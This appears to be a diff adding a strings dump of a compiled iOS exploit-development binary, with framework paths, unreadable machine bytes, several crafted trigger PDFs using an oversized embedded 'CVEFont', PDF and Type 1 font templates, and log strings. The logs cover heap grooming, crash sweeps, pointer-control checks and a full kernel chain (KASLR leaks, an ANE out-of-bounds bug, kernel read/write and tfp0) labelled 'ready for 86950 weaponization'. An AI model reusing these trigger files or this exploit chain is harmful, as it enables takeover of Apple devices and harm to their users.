@@ -1,0 +1,3637 @@
+__PAGEZERO
+__TEXT
+__text
+__TEXT
+__stubs
+__TEXT
+__objc_stubs
+__TEXT
+__objc_methlist
+__TEXT
+__const
+__TEXT
+__cstring
+__TEXT
+__gcc_except_tab__TEXT
+__objc_methname
+__TEXT
+__ustring
+__TEXT
+__objc_classname__TEXT
+__objc_methtype
+__TEXT
+__unwind_info
+__TEXT
+__DATA_CONST
+__const
+__DATA_CONST
+__cfstring
+__DATA_CONST
+__objc_classlist__DATA_CONST
+__objc_protolist__DATA_CONST
+__objc_imageinfo__DATA_CONST
+__objc_arraydata__DATA_CONST
+__objc_arrayobj
+__DATA_CONST
+__got
+__DATA_CONST
+__DATA
+__objc_const
+__DATA
+__objc_selrefs
+__DATA
+__objc_classrefs__DATA
+__objc_superrefs__DATA
+__objc_ivar
+__DATA
+__objc_data
+__DATA
+__data
+__DATA
+__common
+__DATA
+__bss
+__DATA
+__LINKEDIT
+/usr/lib/dyld
+/System/Library/Frameworks/UIKit.framework/UIKit
+/System/Library/Frameworks/ImageIO.framework/ImageIO
+/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics
+/System/Library/Frameworks/Foundation.framework/Foundation
+/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation
+/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit
+/System/Library/Frameworks/IOSurface.framework/IOSurface
+/usr/lib/libobjc.A.dylib
+/usr/lib/libSystem.B.dylib
+?	@q
+*U{v
+TJ{i
+*vzw
+Tjzi
+Tkzi
+*S{t
+TK{i
+TM{k
+mij8
+*3{u
+T+{i
+TI{s
+T,{j
+oih8
+!KJJ
+j38s
+*3{u
+T+{i
+RMyh
+*ih8_U
+T+{i
+U@i7
+T,yx
+TMyx
+@9)	@9
+)kh8?1
+T)#@
+T)'@
+T)+@
+T)/@
+T)3@
+T);@
+T)?@
+T)C@
+T)G@
+T)K@
+T)O@
+T)S@
+T)W@
+T)[@
+T)_@
+T)c@
+T)g@
+T)k@
+T)o@
+T)s@
+T)w@
+T){@
+C69	
+	*+(
+=*!@
+TwF@
+	*/(
+T5{x
+J)=@
+Tvj|
+T(k{8
+*ih8_
+Lih8
+T){w
+q$	@
+q`9@
+TSky
+=)	@
+Tzzy
+i)8)
+R/}@
+ N!@
+Iii8		
+Iii8	
+Iii8	
+Iii8	
+Iii8	
+Iii8	
+Iii8	!
+Iii8	%
+SIii8	)
+9)lX
+Iii8	-
+9)\T
+Iii8	1
+9)LP
+Iii8	5
+9)<L
+Iii8	9
+9),H
+Iii8	=
+Iii8	A
+Iii8	E
+T*	@
+T*	@
+R,ik
+THk{8
+@9M	@9N
+"n|[ n
+"nZ[ n
+.@y3
+TvB_
+	!J9?
+*h>A
+	!@y
+%@yK
+=hKA
+RhKA
+j)8*
+Hki8
+T	y)
+4!SA
+_A9h
+	AK9
+T`VB
++ih8J	
+CCCCCCCC
+AAAAAAAABBBBBBBBDDDDDDDD
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 31 >>
+stream
+BT /F1 512 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000327 00000 n 
+0000000488 00000 n 
+0000000663 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1171
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 31 >>
+stream
+BT /F1 256 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000327 00000 n 
+0000000488 00000 n 
+0000000663 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1171
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 31 >>
+stream
+BT /F1 128 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000327 00000 n 
+0000000488 00000 n 
+0000000663 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1171
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 30 >>
+stream
+BT /F1 64 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000326 00000 n 
+0000000487 00000 n 
+0000000662 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1170
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 30 >>
+stream
+BT /F1 32 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000326 00000 n 
+0000000487 00000 n 
+0000000662 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1170
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 30 >>
+stream
+BT /F1 16 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000326 00000 n 
+0000000487 00000 n 
+0000000662 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1170
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 29 >>
+stream
+BT /F1 8 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000325 00000 n 
+0000000486 00000 n 
+0000000661 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1169
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 29 >>
+stream
+BT /F1 4 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000325 00000 n 
+0000000486 00000 n 
+0000000661 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1169
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 29 >>
+stream
+BT /F1 2 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000325 00000 n 
+0000000486 00000 n 
+0000000661 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1169
+%%EOF
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>
+endobj
+4 0 obj
+<< /Length 32 >>
+stream
+BT /F1 1024 Tf 5 5 Td (A) Tj ET
+endstream
+endobj
+5 0 obj
+<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont /FirstChar 65 /LastChar 65 /Widths [100] /Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 /FontBBox [0 0 4 40] /ItalicAngle 0 /Ascent 100 /Descent -100 /CapHeight 100 /StemV 80 /FontFile2 7 0 R >>
+endobj
+7 0 obj
+<< /Length 423 /Length1 852 /Filter /FlateDecode >>
+stream
+RK/CQ
+4HHh
+wJHq
+/Afe[
+X"sq
+endstream
+endobj
+xref
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000121 00000 n 
+0000000247 00000 n 
+0000000328 00000 n 
+0000000489 00000 n 
+0000000664 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+1172
+%%EOF
+CRASH si own
+ far
+ pc=
+ lr=
+ sp=
+ x1=
+ x2=
+ x8=
+ x9=
+AAAAAAAA
+AAAAAAAABBBBBBBB
+UUUUUU
+kPDi
+4AN[hu
++8ER_ly
+"/<IVcp}
+ $(,048<
+09$B
+*<H-3EK
+N[86950] force-reset: torn gate cleared
+[86950] === Stage -1: CVE-2026-86950 detection ===
+[86950v2] === Stage -1 exploit probe v4 ===
+NJ_86950X_ATTEMPTS
+[86950v5] === Tf-sweep ===
+NJ_86950_TF
+[86950v7] === groom aiming (tf=1024) ===
+1024
+[86950v10] === CG size-sweep ===
+NJ_86950_V10_K
+MallocCorruptionAbort
+[86950v11] === VM-reservation groom ===
+NJ_86950_V11_K
+[86950v11] r=%d addr=0x%llx in_vm=%d vm_hits=%d m_hits=%d
+[86950v12] === smart exploit (VM holes + shaped) ===
+MallocLargeDisableMadvise
+[86950v12] step 1: VM holes 64 x 8MB
+[86950v12] step 2: shaped 1024 x 16KB
+[86950v12] step 3: render TF=1024
+[86950v12] result: r=%d vm_hits=%d shaped_hits=%d
+[86950diag] === diag ===
+[86950diag] no crash rc=%d
+[86950diag] CRASH sig=%d addr=0x%llx
+[86950diag] vm_region: %s
+[86950diag] low16=0x%llx page_aligned=%d
+[86950diag] lr=0x%llx pc=0x%llx
+--- [TEST] 86950 groom dump ---
+step 1: VM groom 64 x 8MB
+step 2: shaped groom 1024 x 16KB
+step 3: render TF=1024
+render result: r=%d sig=%d far=0x%llx
+step 4: detailed VM scan
+VM[%d] CORRUPTED: %d bytes, offs 0x%zx..0x%zx (region 0x%llx)
+  dump @ 0x%zx:
+    +0x%04zx: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x
+step 5: shaped scan
+=== SUMMARY: total_vm_hits=%d shaped_hits=%d ===
+--- [TEST] 86950 groom payload ---
+step 1: VM groom with fake headers
+allocated %d x 8MB
+step 2: shaped groom
+step 4: scan fake markers
+VM[%d] CG WROTE INTO FAKE HEADER:
+  +0x28: 0x%016llx
+  +0x38: 0x%016llx
+  +0x40: 0x%016llx
+  +0x48: 0x%016llx
+=== SUMMARY: writes_detected=%d ===
+[86950wc] === coverage width sweep (using real triggers) ===
+HOME
+/tmp
+%s/nj_86950_wc.state
+[86950wc] launch idx=%d/%d tf=%ld
+[86950wc] tf=%-5ld CRASH sig=%d far=0x%016llx %s%s%s
+[USER]
+[STACK-LIKE]
+[86950wc] tf=%-5ld no crash (patched / Tf too small)
+[86950wc] tf=%-5ld error rc=%d
+[86950bs] === bbox sweep (real triggers, all Tf) ===
+[86950bs] tf=%-5ld far=0x%016llx %s%s
+[86950bs] tf=%-5ld no crash
+[86950bs] tf=%-5ld torn (rc=%d)
+[86950sm] === stack mode (small Tf, real triggers) ===
+[86950sm] tf=%-4ld far=0x%016llx %s%s
+[86950sm] tf=%-4ld no crash
+[86950sm] tf=%-4ld torn
+[86950gh3] === huge groom FIXED 16-28 GB (safe, free) ===
+[86950gh3] mapped[%d] 0x%llx
+[86950gh3] mapped %d regions (
+256MB = %d MB), failed %d
+[86950gh3] no regions mapped (memory full)
+[86950gh3] rendering TF=1024
+[86950gh3] r=%d far=0x%llx (%.2f GB)
+[86950gh3] !! far INSIDE region[%d] off=0x%llx
+[86950gh3] CORRUPTION region[%d] @+0x%x
+[86950gh3] === SUMMARY: %d/%d corrupted, shaped=%d, far_in=%d ===
+[86950gh3] freed %d regions
+[86950cg] === CG-allocator groom (CGBitmapContext) ===
+[86950cg] ctx[%d] failed at %d
+[86950cg] created %d contexts (~%zu MB)
+[86950cg] total contexts: %d, total memory ~%zu MB
+[86950cg] rendering TF=1024
+[86950cg] r=%d sig=%d far=0x%llx (%.2f GB)
+[86950cg] !! far INSIDE ctx[%d] off=0x%llx
+[86950cg] CORRUPTION ctx[%d] @+0x%x: %02x %02x %02x %02x
+[86950cg] ...more elided
+[86950cg] === SUMMARY: %d/%d corrupted, shaped=%d, far_in_ctx=%d ===
+[chain] ============================================
+[chain] FULL CHAIN: KASLR 
+ ANE 
+ KRW 
+ 86950
+[chain] step 1/5: KASLR leaks
+[chain] KASLR result: r=%d reg=0x%llx aio=0x%llx surf=0x%llx
+[chain] !! KASLR FAILED 
+ no leaks. Cannot proceed.
+[chain] Tip: run 'KASLR' mode alone to see details per-CVE
+[chain] step 2/5: ANE OOB (need surf)
+[chain] !! no surf from KASLR, trying ANE ALT-PATH (scaler)
+[chain] ANE result: r=%d victim=0x%x
+[chain] !! ANE FAILED 
+ no victim port. Cannot build tfp0.
+[chain] step 3/5: KRW build (need reg + surf + victim)
+[chain] KRW result: r=%d tfp0=%p kslide=0x%llx
+[chain] !! KRW FAILED 
+ no tfp0.
+[chain] 
+ TFP0 acquired: %p, kslide=0x%llx
+[chain] step 4/5: 86950 trigger to get far
+[chain] 86950 no crash (patched? rc=%d)
+[chain] 86950 far=0x%llx
+[chain] step 5/5: protect far with tfp0
+[chain] tfp0 
+[chain]   - kread64/64kwrite64 
+ kernel memory
+[chain]   - 
+ CG kernel structures (aa_ctx 
+ kernel heap)
+[chain]   - 
+ mesh_ptr 
+ controlled kernel data
+[chain] Chain complete: tfp0 ready for 86950 weaponization
+--nj-pdf-test
+[86950] in-process detection
+NJ_86950_GROOM
+NJ_86950_CHAR
+NJ_86950_GROOM_SZ
+[86950] sigaction install failed: %s
+[86950] recovered sig=%d far=0x%llx pc=0x%llx lr=0x%llx
+[86950] FOREIGN-THREAD sig=%d far=0x%llx pc=0x%llx lr=0x%llx
+[86950v11] vm-groom: %d x %zu (tail %zu)
+[86950v12] vm-groom: allocated %d x %zu
+[86950v12] vm-groom: freed %d holes
+null
+UNMAPPED (kr=%d)
+base=0x%llx sz=0x%llx prot=%d/%d off=0x%llx
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
+   /Resources << /Font << /F1 4 0 R >> >>
+   /Contents 5 0 R >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /CVEFont
+   /FirstChar 0 /LastChar 255 /Widths [
+   /FontDescriptor 6 0 R /Encoding /StandardEncoding >>
+endobj
+/F1 %ld Tf
+100 700 Td
+(%s) Tj
+5 0 obj
+<< /Length %zu >>
+stream
+endstream
+endobj
+6 0 obj
+<< /Type /FontDescriptor /FontName /CVEFont /Flags 4
+   /FontBBox [-32767 -32767 32767 32767]
+   /ItalicAngle 0 /Ascent 800 /Descent -200
+   /CapHeight 700 /StemV 80
+   /FontFile 7 0 R >>
+endobj
+7 0 obj
+<< /Length %zu /Length1 %zu /Length2 %zu /Length3 %zu >>
+stream
+endstream
+endobj
+xref
+0000000000 65535 f 
+%010ld 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+%%%%EOF
+%!PS-AdobeFont-1.0: CVEFont 1.0
+11 dict begin
+/FontInfo 7 dict dup begin
+/FullName (CVEFont) readonly def
+/FamilyName (CVEFont) readonly def
+/Weight (Normal) readonly def
+/ItalicAngle 0 def
+/isFixedPitch false def
+/UnderlinePosition -100 def
+/UnderlineThickness 50 def
+end readonly def
+/FontName /CVEFont def
+/PaintType 0 def
+/FontType 1 def
+/FontMatrix [0.00006103515625 0 0 0.00006103515625 0 0] def
+/Encoding 256 array
+0 1 255 {1 index exch /.notdef put} for
+dup %d /%c put
+readonly def
+/FontBBox [-32767 -32767 32767 32767] def
+currentdict end
+currentfile eexec
+dup /Private 8 dict dup begin
+/lenIV 4 def
+/Subrs 0 array def
+/password 5839 def
+/RD {string currentfile exch readstring pop} executeonly def
+/ND {noaccess def} executeonly def
+/NP {noaccess put} executeonly def
+2 index /CharStrings 27 dict dup begin
+/.notdef %zu RD 
+/Z %zu RD 
+/%c %zu RD 
+readonly put
+noaccess put
+dup /FontName get exch definefont pop
+mark currentfile closefile
+0123456789abcdef
+cleartomark
+[86950] thumbnail NULL
+/nj_c0_sweep.state
+/nj_c0_fars.txt
+/nj_r_sweep.state
+/nj_payload_sweep.state
+/nj_shading_crash.log
+/nj_batch_idx
+/nj_batch_results.txt
+%s%s
+[112611] force-reset: torn gate cleared, sweep state files removed
+[112611x] === Stage -1b exploit experiment (controlled OOB write) ===
+NJ_SHADING_BATCH
+%s/nj_pdfs
+[batch] first run -> generating pdf set...
+[112611x] experiment result: 0 (batch step)
+NJ_SHADING_R
+NJ_SHADING_PATTERN
+NJ_SHADING_GROOM
+[112611x] render R=%d pdf=%zu bytes, groom=%d
+[112611x] === Stage -1b exploit experiment v5 (cfg0-baseline fix) ===
+NJ_SHADING_C0SWEEP
+NJ_SHADING_PAYLOAD
+[112611x] diagnostic render skipped (sweep enabled: c0=%d payload=%d) -> crash budget reserved for sweep
+[112611x] CRASH sig=%d addr=0x%llx
+[112611x] far=0x%016llx pc=0x%016llx lr=0x%016llx sp=0x%016llx
+[112611x] x0=0x%016llx x1=0x%016llx x2=0x%016llx x3=0x%016llx
+[112611x] x4=0x%016llx x5=0x%016llx x6=0x%016llx x7=0x%016llx
+[112611x] PC image=%s base=%p sym=%s
+[112611x] PC offset-in-image=0x%llx
+[112611x] dladdr(pc) FAILED pc=0x%llx
+[112611x] LR image=%s base=%p sym=%s off=0x%llx
+[112611x] x%d=0x%016llx x%d=0x%016llx x%d=0x%016llx x%d=0x%016llx
+[112611x] !! fault-addr base == x%d (0x%llx)
+[112611x] render OK (no crash)
+[112611x] !! %d groom buffers modified -> OOB write LANDED in controlled heap
+[112611x] no groom corruption observed (OOB went elsewhere / faulted first)
+NJ_SHADING_ABW
+NJ_SHADING_AIM
+[112611c] C0-sweep skipped (payload probe owns crash budget this launch)
+[112611c] C0-sweep skipped (set NJ_SHADING_C0SWEEP=1)
+NJ_SHADING_GEOM
+[112611g] geometry probe skipped (set NJ_SHADING_GEOM=1)
+NJ_SHADING_PROBE
+NJ_SHADING_MARK
+[112611p] slot probe skipped (set NJ_SHADING_PROBE=1)
+[112611pl] payload probe skipped (set NJ_SHADING_PAYLOAD=1)
+NJ_SHADING_SWEEP
+[112611s] R-sweep skipped (payload probe owns crash budget this launch)
+[112611s] R-sweep skipped (set NJ_SHADING_SWEEP=1 to run)
+[112611x] experiment result: %d
+[112611] === Stage -1b: CVE-2026-112611 shading OOB detection ===
+[112611] spawn result: %d
+[112611] no spawn -> in-process fallback
+[112611] in-process result: %d (%s)
+vulnerable
+patched/no-trigger
+error
+[112611m] === manual C0 test: 0x%016llx ===
+0x%016llx
+NJ_SHADING_C0
+NJ_SHADING_C1
+NJ_SHADING_RANGE_MAX
+[112611m] PDF build failed
+[112611m] rendering pdf=%zu bytes, R=136
+[112611m] CRASH sig=%d
+[112611m]   far = 0x%016llx
+[112611m]   lr  = 0x%016llx
+[112611m]   pc  = 0x%016llx
+[112611m]   far&0xFFFF = 0x%04llx
+[112611m]   C0&0xFFFF  = 0x%04llx
+[112611m] !! POINTER CONTROL CONFIRMED: far contains C0 low bits
+[112611m] !! far high 32 bits match C0 high 32 bits
+[112611m] no crash (rc=%d)
+[112611m2] === manual C0/C1 test C0=0x%016llx C1=0x%016llx ===
+[112611m2] rendering R=%d
+[112611m2] PDF build failed
+[112611m2] CRASH sig=%d
+[112611m2]   far = 0x%016llx
+[112611m2]   lr  = 0x%016llx
+[112611m2]   pc  = 0x%016llx
+[112611m2]   far&0xFFFF = 0x%04llx
+[112611m2] !! far low16 == C0 low16
+[112611m2] !! far low16 == C1 low16
+[112611m2] !! far high == C0 high
+[112611m2] !! far high == C1 high
+[112611m2] no crash (rc=%d)
+[112611rs] === R-sweep C0=0x%016llx C1=0x%016llx ===
+[112611rs] R=%d build failed
+USER
+OTHER
+[112611rs] R=%-3d CRASH sig=%d far=0x%016llx lr=0x%016llx [%s]
+[112611rs] R=%-3d no crash
+[112611rs] R=%-3d CG torn (skipped)
+[112611rs] === result: first user-space crash at R=%d far=0x%016llx ===
+[112611mega] === R x C0 grid sweep ===
+[112611mega] R=%-3d C0=0x%016llx far=0x%016llx %s
+<<< USER-SPACE
+[112611mega]   !! non-standard low16 = 0x%04llx
+[112611mega] === done: %d crashes, %d user-space ===
+[112611micro] === micro sweep (R=8): C0 low/denorm/neg, Dec, Coord ===
+baseline C0=1.0
+C0_low=0x0001
+C0_low=0x0010
+C0_low=0x0100
+C0_low=0x1000
+C0_low=0x10000
+C0_low=0x100000
+C0_low=0xFFFFFFFF
+C0_mid=0x0000001000000
+C0_mid=0x0000100000000
+C0_high=0x400 (2.0)
+C0_high=0x401 (4.0)
+C0=-1.0 (0xBFF)
+C0=-0.5 (0xBFE)
+C0=-2.0 (0xC00)
+C0_denorm=0x1
+C0_denorm=0x1000
+C0_denorm=0x80000000
+C0=DBL_MIN (0x001)
+C0=1e-200 (0x089)
+C0=1e-100 (0x2B2)
+C0=1e-10 (0x3DD)
+C0=1e-5 (0x3EE)
+Dec=1
+Dec=10
+Dec=1000
+1000
+Dec=100000
+100000
+Dec=1000000
+1000000
+Coord=1
+Coord=0x100
+Coord=0x10000
+65536
+Coord=0x1000000
+16777216
+Coord=0x7FFFFFFF
+2147483647
+NJ_SHADING_DECODE
+NJ_SHADING_COORD
+268435456
